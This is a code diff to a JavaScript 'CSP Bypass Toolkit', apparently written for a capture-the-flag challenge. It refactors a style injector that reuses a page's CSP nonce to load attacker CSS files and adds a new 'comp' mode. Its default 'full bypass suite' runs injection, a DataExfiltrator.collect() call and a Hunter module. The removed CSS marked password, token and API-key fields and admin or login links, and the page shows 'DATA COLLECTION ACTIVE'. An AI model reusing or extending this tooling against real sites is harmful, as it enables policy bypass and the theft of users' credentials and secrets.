@@ -91,40 +91,44 @@ const StyleInjector = {
         switch (type) {
             case 'basic':
                 return this.injectBasic(nonce);
-            case 'vomp':
-                return this.injectVomp(nonce);
+            case 'comp':
+                return this.injectComp(nonce);
             case 'exfill':
                 return this.injectExfill(nonce);
             case 'hunter':
                 return this.injectHunter(nonce);
+            case 'vomp':
+                return this.injectVomp(nonce);
             default:
                 return this.injectBasic(nonce);
         }
     },
+
+    injectCSSFile(nonce, filename) {
+        const link = document.createElement('link');
+        link.rel = 'stylesheet';
+        link.href = filename;
+        link.setAttribute('nonce', nonce);
+        
+        link.onload = () => {
+            console.log(`✅ [INJECT] Loaded ${filename}`);
+        };
+        
+        link.onerror = () => {
+            console.log(`❌ [INJECT] Failed to load ${filename}`);
+        };
+        
+        document.head.appendChild(link);
+        console.log(`🎨 [INJECT] Injecting ${filename}`);
+        return true;
+    },
     
     injectBasic(nonce) {
-        const style = document.createElement('style');
-        style.setAttribute('nonce', nonce);
-        style.textContent = `
-            /* Basic CSP Bypass Indicator */
-            body::before {
-                content: 'CSP BYPASS ACTIVE ✅';
-                position: fixed;
-                top: 10px;
-                right: 10px;
-                background: #28a745;
-                color: white;
-                padding: 10px;
-                border-radius: 5px;
-                z-index: 999999;
-                font-family: monospace;
-                font-size: 14px;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-            }
-        `;
-        document.head.appendChild(style);
-        console.log('✅ [INJECT] Basic style injected');
-        return true;
+        return this.injectCSSFile(nonce, 'basic.css');
+    },
+
+    injectComp(nonce) {
+        return this.injectCSSFile(nonce, 'comp.css');
     },
     
     injectVomp(nonce) {
@@ -188,38 +192,7 @@ const StyleInjector = {
     },
     
     injectExfill(nonce) {
-        const style = document.createElement('style');
-        style.setAttribute('nonce', nonce);
-        style.textContent = `
-            /* Exfiltration Data Collection Styles */
-            .exfill-indicator {
-                position: fixed;
-                bottom: 10px;
-                left: 10px;
-                background: #dc3545;
-                color: white;
-                padding: 8px;
-                border-radius: 3px;
-                z-index: 999999;
-                font-family: monospace;
-                font-size: 12px;
-                animation: blink 1s infinite;
-            }
-            
-            @keyframes blink {
-                0%, 50% { opacity: 1; }
-                51%, 100% { opacity: 0.3; }
-            }
-            
-            /* Hide sensitive inputs visually while keeping them functional */
-            input[type="password"]:focus,
-            input[name*="pass"]:focus,
-            input[name*="secret"]:focus {
-                background: #ffe6e6 !important;
-                border: 2px solid red !important;
-            }
-        `;
-        document.head.appendChild(style);
+        const result = this.injectCSSFile(nonce, 'exfill.css');
         
         // Add exfiltration indicator
         const indicator = document.createElement('div');
@@ -227,70 +200,11 @@ const StyleInjector = {
         indicator.textContent = '📡 DATA COLLECTION ACTIVE';
         document.body.appendChild(indicator);
         
-        console.log('✅ [INJECT] Exfiltration styles injected');
-        return true;
+        return result;
     },
     
     injectHunter(nonce) {
-        const style = document.createElement('style');
-        style.setAttribute('nonce', nonce);
-        style.textContent = `
-            /* Hunter Mode - Highlight sensitive data */
-            
-            /* Highlight forms */
-            form {
-                outline: 2px dashed #ff6b6b !important;
-                background: rgba(255, 107, 107, 0.1) !important;
-            }
-            
-            /* Highlight password fields */
-            input[type="password"],
-            input[name*="pass"],
-            input[name*="pwd"] {
-                outline: 3px solid #e74c3c !important;
-                background: rgba(231, 76, 60, 0.2) !important;
-            }
-            
-            /* Highlight sensitive inputs */
-            input[name*="secret"],
-            input[name*="token"],
-            input[name*="key"],
-            input[name*="api"] {
-                outline: 3px solid #f39c12 !important;
-                background: rgba(243, 156, 18, 0.2) !important;
-            }
-            
-            /* Highlight links */
-            a[href*="admin"],
-            a[href*="login"],
-            a[href*="api"],
-            a[href*="secret"] {
-                background: yellow !important;
-                color: black !important;
-                font-weight: bold !important;
-            }
-            
-            /* Add hunter status */
-            body::after {
-                content: '🎯 HUNTER MODE ACTIVE - Sensitive data highlighted';
-                position: fixed;
-                top: 50%;
-                left: 10px;
-                transform: translateY(-50%);
-                background: #8e44ad;
-                color: white;
-                padding: 10px;
-                border-radius: 5px;
-                z-index: 999999;
-                font-family: monospace;
-                font-size: 12px;
-                writing-mode: vertical-lr;
-            }
-        `;
-        document.head.appendChild(style);
-        
-        console.log('✅ [INJECT] Hunter mode styles injected');
-        return true;
+        return this.injectCSSFile(nonce, 'flag_hunter.css');
     }
 };
 
@@ -680,6 +594,10 @@ const CSPBypass = {
                 StyleInjector.inject(nonce, 'basic');
                 break;
                 
+            case 'comp':
+                StyleInjector.inject(nonce, 'comp');
+                break;
+                
             case 'vomp':
                 StyleInjector.inject(nonce, 'vomp');
                 break;
@@ -716,6 +634,8 @@ const CSPBypass = {
             default:
                 console.log('🔥 [MAIN] Running full bypass suite...');
                 StyleInjector.inject(nonce, 'basic');
+                StyleInjector.inject(nonce, 'comp');
+                StyleInjector.inject(nonce, 'exfill');
                 StyleInjector.inject(nonce, 'hunter');
                 const fullData = DataExfiltrator.collect();
                 const huntResults = Hunter.hunt();
@@ -743,9 +663,10 @@ if (document.readyState === 'loading') {
 // Expose global functions for manual execution
 window.CSPBypass = CSPBypass;
 window.runBasic = () => CSPBypass.run('basic');
+window.runComp = () => CSPBypass.run('comp');
 window.runVomp = () => CSPBypass.run('vomp');
 window.runExfill = () => CSPBypass.run('exfill');
 window.runHunter = () => CSPBypass.run('hunter');
 window.runFlag = () => CSPBypass.run('flag');
 
-console.log('🔥 CSP Bypass Toolkit Ready - Use CSPBypass.run() or window.runBasic/runVomp/runExfill/runHunter/runFlag()'); 
+console.log('🔥 CSP Bypass Toolkit Ready - Use CSPBypass.run() or window.runBasic/runComp/runVomp/runExfill/runHunter/runFlag()'); 
